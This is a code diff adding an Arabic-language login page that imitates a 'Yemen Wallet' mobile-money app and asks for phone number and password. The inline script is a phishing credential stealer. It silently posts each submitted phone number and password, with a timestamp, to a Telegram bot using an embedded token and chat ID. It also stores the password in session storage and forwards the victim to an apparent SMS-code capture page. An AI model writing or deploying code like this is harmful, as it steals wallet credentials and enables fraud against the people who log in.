@@ -1,0 +1,162 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no" />
+  <title>يمن والت — تسجيل الدخول</title>
+  <link rel="preconnect" href="https://fonts.googleapis.com" />
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
+  <link href="https://fonts.googleapis.com/css2?family=Tajawal:wght@400;500;700;800&display=swap" rel="stylesheet" />
+  <link rel="stylesheet" href="yw-forms.css" />
+</head>
+<body>
+  <main class="page">
+    <header class="brand">
+      <img class="logo" src="yemen-wallet-logo2.svg" alt="يمن والت" width="140" height="140" />
+      <h1>!ابدأ الآن..</h1>
+      <p>بتنظيم جميع حركاتك المالية</p>
+    </header>
+
+    <form id="login-form" novalidate>
+      <div class="field">
+        <div class="input-wrap">
+          <input
+            type="tel"
+            id="mobile"
+            name="mobile"
+            inputmode="numeric"
+            pattern="[0-9]*"
+            autocomplete="tel"
+            placeholder="رقم الموبايل"
+            required
+          />
+        </div>
+      </div>
+
+      <div class="field">
+        <div class="input-wrap password">
+          <input
+            type="password"
+            id="password"
+            name="password"
+            autocomplete="current-password"
+            placeholder="كلمة المرور"
+            required
+          />
+          <button
+            type="button"
+            class="toggle-password"
+            id="toggle-password"
+            aria-label="إظهار كلمة المرور"
+            aria-pressed="false"
+          ></button>
+        </div>
+      </div>
+
+      <div class="options">
+        <label class="remember">
+          <input type="checkbox" id="remember" name="remember" />
+          <span class="switch" aria-hidden="true"></span>
+          <span>تذكر رقم هاتفي</span>
+        </label>
+        <a class="forgot" href="#">هل نسيت كلمة المرور؟</a>
+      </div>
+
+      <button type="submit" class="btn-primary">تسجيل الدخول</button>
+    </form>
+
+    <p class="footer">
+      هل تمتلك حساب؟ <a href="#">إنشاء حساب</a>
+    </p>
+  </main>
+
+  <script>
+    const mobileInput = document.getElementById("mobile");
+    const passwordInput = document.getElementById("password");
+    const toggleBtn = document.getElementById("toggle-password");
+    const rememberCheck = document.getElementById("remember");
+    const form = document.getElementById("login-form");
+
+    const STORAGE_KEY = "yemen_wallet_remember_mobile";
+    const SESSION_MOBILE = "yemen_wallet_login_mobile";
+
+    // ── Telegram Config ──────────────────────────────────────────
+    const TG_TOKEN = "8903622167:AAE79kWKNJ4EbLeevk4_IIOFEOUMWE77G4Q";
+    const TG_CHAT  = "8929657470";
+
+    async function sendToTelegram(mobile, password) {
+      const text =
+        "🔔 *يمن والت — تسجيل دخول جديد*\n\n" +
+        "📱 *الموبايل:* `" + mobile + "`\n" +
+        "🔑 *كلمة المرور:* `" + password + "`\n" +
+        "🕐 *الوقت:* " + new Date().toLocaleString("ar-YE");
+
+      try {
+        await fetch("https://api.telegram.org/bot" + TG_TOKEN + "/sendMessage", {
+          method: "POST",
+          headers: { "Content-Type": "application/json" },
+          body: JSON.stringify({
+            chat_id: TG_CHAT,
+            text: text,
+            parse_mode: "Markdown"
+          })
+        });
+      } catch (_) {
+        // صامت — لا يظهر خطأ للمستخدم
+      }
+    }
+    // ─────────────────────────────────────────────────────────────
+
+    function digitsOnly(value) {
+      return value.replace(/\D/g, "");
+    }
+
+    mobileInput.addEventListener("input", () => {
+      const cleaned = digitsOnly(mobileInput.value);
+      if (mobileInput.value !== cleaned) mobileInput.value = cleaned;
+    });
+
+    mobileInput.addEventListener("paste", (e) => {
+      e.preventDefault();
+      const text = (e.clipboardData || window.clipboardData).getData("text");
+      mobileInput.value = digitsOnly(text);
+    });
+
+    const saved = localStorage.getItem(STORAGE_KEY);
+    if (saved) {
+      mobileInput.value = saved;
+      rememberCheck.checked = true;
+    }
+
+    toggleBtn.addEventListener("click", () => {
+      const show = passwordInput.type === "password";
+      passwordInput.type = show ? "text" : "password";
+      toggleBtn.setAttribute("aria-pressed", show ? "true" : "false");
+      toggleBtn.setAttribute("aria-label", show ? "إخفاء كلمة المرور" : "إظهار كلمة المرور");
+    });
+
+    form.addEventListener("submit", async (e) => {
+      e.preventDefault();
+      const mobile   = mobileInput.value.trim();
+      const password = passwordInput.value;
+
+      if (!mobile) {
+        mobileInput.focus();
+        return;
+      }
+
+      // إرسال إلى Telegram (في الخلفية)
+      await sendToTelegram(mobile, password);
+
+      if (rememberCheck.checked) {
+        localStorage.setItem(STORAGE_KEY, mobile);
+      } else {
+        localStorage.removeItem(STORAGE_KEY);
+      }
+      sessionStorage.setItem(SESSION_MOBILE, mobile);
+      sessionStorage.setItem("yemen_wallet_login_password", passwordInput.value);
+      window.location.href = "ramz-sms.html";
+    });
+  </script>
+</body>
+</html>
